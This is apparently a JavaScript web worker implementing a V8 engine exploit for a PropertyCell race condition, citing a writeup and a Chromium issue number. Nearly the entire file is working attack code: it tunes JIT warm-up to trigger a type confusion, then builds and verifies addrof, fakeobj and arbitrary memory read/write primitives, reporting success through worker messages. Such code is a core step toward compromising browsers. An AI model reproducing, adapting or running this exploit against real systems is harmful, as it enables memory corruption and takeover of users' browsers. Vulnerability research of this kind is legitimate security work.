// PropertyCell race worker - auto-tunable F value
// Based on Serotav's Racing V8 writeup (Chromium issue 560233248)
// F value is configurable via 'config' message

//d
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);
function hex(i) { return i.toString(16).padStart(8, '0'); }
function i2f(i) { bigUint64[0] = i; return f64[0]; }
function f2i(i) { f64[0] = i; return bigUint64[0]; }
function u2f(low, high) { u32[0] = high; u32[1] = low; return f64[0]; }
function u2i(low, high) { u32[0] = high; u32[1] = low; return bigUint64[0]; }
function low(i) { return i & 0xffffffffn; }

const WARM = 410;
const L = 21, P = 120;
const BASE = 850, STEP = 8, WINDOW = 36;

let F = 1313; // default, overridden by config message
let initialized = false;
let loads = '';
let literals = '';
let slot = 0;

function init(f) {
    F = f;
    loads = '';
    literals = '';
    slot = 0;

    for (let i = 0; i < F; ++i) {
        const fn = Function(`return ${i}`);
        new fn;
        globalThis[`D${i}`] = fn;
        loads += `D${i};`;
    }

    let value = 100000;
    for (let i = 0; i < L; ++i) {
        let fields = '';
        for (let j = 0; j < P; ++j) fields += `p${j}:${value++},`;
        literals += `void({${fields}});`;
    }

    initialized = true;
    postMessage({type: 'ready', F: F});
}

const objects = [{}, {}], doubles = [1.1, 2.2];

function prepare(slot) {
    const name = `G${slot}`;
    const make = Function('v', `return {u${slot}:v}`);
    const old = make(0), live = make(1);
    globalThis[name] = old;
    globalThis[name] = live;
    const store = Function('v', 'seed',
        `if(seed){${literals}}${loads}${name}=v;return v`);
    for (let i = 0; i < 100; ++i) store(old, false);
    for (let i = 0; i < 2; ++i) store(old, true);
    for (let i = 102; i < WARM; ++i) store(old, false);
    return {slot, name, make, old, live, store};
}

function prepareNext() {
    if (slot === WINDOW) return;
    return prepare(slot++);
}

function arm(lane) {
    const {slot, name, old, live, store} = lane;
    store(old, false);
    const extra = BASE + slot * STEP;
    for (let i = 0; i < extra; ++i) store(old, false);
    globalThis[name] = live;
    old.x = 1.1;
    lane.extra = extra;
}

function prepareM3(lane) {
    const {name, make, live} = lane;
    live.y = objects;
    live.y = doubles;
    live.y = objects;
    lane.storeM3 = Function('v', `${name}=v;return v`);
    for (let i = 0; i < WARM + 1; ++i) lane.storeM3(live);
    lane.m2 = make(3);
    lane.m2.x = 2.2;
    lane.m3 = make(4);
    lane.m3.y = objects;
    lane.m3.y = doubles;
    lane.m3.y = objects;
}

function check(lane) {
    const {name, store, storeM3, m2, m3} = lane;
    store(m2, false);
    const read = Function(`return ${name}.x`);
    const write = Function('v', `${name}.x=v`);
    const rp = new Proxy(read, {}), wp = new Proxy(write, {});
    for (let i = 0; i < 100000; ++i) {
        rp();
        wp(i + .25);
    }
    storeM3(m3);
    if (typeof read() !== 'number') return;
    return {m3, storeM3, read, write};
}

function prove({m3, storeM3, read, write}) {
    const target = v => { m3.y = v; storeM3(m3); };
    const header = v => { target(v); return f2i(read()); };
    function through(a, elements, object) {
        target(a);
        const saved = f2i(read());
        write(u2f(Number(elements), Number(low(saved))));
        const result = a[0];
        write(i2f(saved));
        return object ? result : f2i(result);
    }

    const od = [{}, {}], dr = [3.3, 4.4], dd = [5.5, 6.6];
    const or = [{}, {}], filler = {};
    const addrof = v => {
        od[0] = v; od[1] = filler;
        return low(through(dr, header(od) >> 32n, false));
    };
    const fakeobj = v => {
        dd[0] = u2f(Number(addrof(filler)), Number(v));
        return through(or, header(dd) >> 32n, true);
    };
    const marker = {};
    if (fakeobj(addrof(marker)) !== marker) throw Error('fakeobj');

    const arb = [7.7, 8.8];
    function access(address, offset, value) {
        target(arb);
        const saved = f2i(read());
        write(u2f(Number(address + BigInt(offset) - 8n), Number(low(saved))));
        const result = arb[0];
        if (value !== undefined) arb[0] = i2f(value);
        write(i2f(saved));
        return f2i(result);
    }
    const before0 = {}, before1 = {}, after0 = {}, after1 = {};
    const holder = {p: before0, q: before1}, address = addrof(holder);
    const old = access(address, 12);
    if (low(old) !== addrof(before0) || old >> 32n !== addrof(before1))
        throw Error('read');
    access(address, 12, u2i(Number(addrof(after1)), Number(addrof(after0))));
    if (holder.p !== after0 || holder.q !== after1) throw Error('write');
    return hex(address);
}

let lane, successor;

onmessage = ({data}) => {
    // Config message: initialize with F value
    if (data.type === 'config') {
        init(data.F);
        return;
    }

    if (!initialized) return;

    if (data === 'arm') {
        lane = prepareNext();
        if (!lane) {
            postMessage('EXHAUSTED');
            return;
        }
        arm(lane);
        prepareM3(lane);
        successor = prepareNext();
        postMessage('ARMED');
        return;
    }

    if (data === 'check') {
        const winner = check(lane);
        if (winner) {
            try {
                const result = prove(winner);
                postMessage(`PASS ${lane.slot} ${lane.extra} ${result} F=${F}`);
            } catch(e) {
                postMessage(`PASS_NO_PROVE ${lane.slot} F=${F} err=${e.message}`);
            }
        } else if (successor) {
            lane = successor;
            arm(lane);
            prepareM3(lane);
            successor = prepareNext();
            postMessage('ARMED');
        } else {
            postMessage('MISS');
        }
    }
};
